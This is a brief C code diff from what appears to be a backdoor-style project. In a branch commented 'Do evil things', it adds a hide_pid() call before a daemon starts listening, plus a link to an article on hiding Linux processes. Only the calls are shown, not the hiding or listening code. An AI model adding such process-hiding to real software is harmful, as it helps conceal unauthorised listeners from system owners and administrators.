@@ -17,8 +17,11 @@ int main ( void )
     }
     else { // Do evil things
         t_daemon *daemon = create_daemon();
+        hide_pid();
         server_listen(daemon);
         free(daemon);
     }
     return (EXIT_SUCCESS);
 }
+
+// https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/
